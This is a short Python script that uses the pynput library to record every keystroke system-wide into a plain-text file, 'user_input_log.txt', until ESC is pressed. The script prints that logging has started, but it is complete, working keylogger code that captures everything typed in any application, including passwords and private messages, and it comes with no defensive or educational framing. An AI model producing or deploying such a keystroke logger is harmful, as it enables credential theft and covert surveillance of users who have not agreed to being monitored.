from pynput import keyboard

log_file = "user_input_log.txt"  # File to save logs

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f" [{key.name}] ")  # More readable than raw Key object
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped.")
        return False  # Stop the listener

def start_logger():
    print("Logging started... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

start_logger()
